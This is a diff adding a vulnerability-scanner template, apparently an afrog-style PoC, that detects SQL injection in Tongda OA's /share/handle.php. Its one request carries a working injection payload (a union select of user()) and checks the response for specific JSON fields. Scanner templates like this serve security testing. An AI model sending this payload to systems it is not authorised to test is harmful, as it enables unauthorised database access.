@@ -1,0 +1,17 @@
+id: tongda-handle-sqli
+
+info:
+  name: 通达OA handle SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  tags: tongda,oa,sqli
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /share/handle.php?_GET[module]=1%27+and+1={`=%27`+1}+and+1=0+union+select+(select/**/user())--+%27
+    expression: response.status == 200 && response.body.bcontains(b'"status":') && response.body.bcontains(b'"short_url":') && response.body.bcontains(b'"img_url":')
+expression: r0()
